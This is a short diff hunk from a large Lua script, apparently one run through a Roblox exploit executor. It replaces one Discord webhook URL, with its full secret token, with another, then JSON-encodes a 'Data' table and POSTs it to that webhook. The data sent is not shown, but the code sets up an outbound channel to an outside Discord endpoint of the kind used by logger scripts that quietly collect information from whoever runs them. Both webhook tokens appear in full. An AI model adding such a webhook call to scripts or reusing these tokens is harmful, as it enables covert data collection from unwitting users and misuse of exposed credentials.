@@ -4871,5 +4871,5 @@ local Headers = {["Content-Type"] = "application/json"}
 local Encoded = HttpService:JSONEncode(Data)
 
 local Request = http_request or request or HttpPost or syn.request
-local Final = {Url = "https://discord.com/api/webhooks/1280238700663537804/VdQupYmAp5wInm3H2-uxKk6TZMkSYWmqzPWq1G3EjepYsT6GLLjD-1iIMCDPoI7eG1_j", Body = Encoded, Method = "POST", Headers = Headers}
+local Final = {Url = "https://discord.com/api/webhooks/1302973479045566464/QOgFFYHwDNUkRjy9venOqzEgtW8KsxT5zQu224cOx0YhImEue-LtkWW0SeaVO769iXfr", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
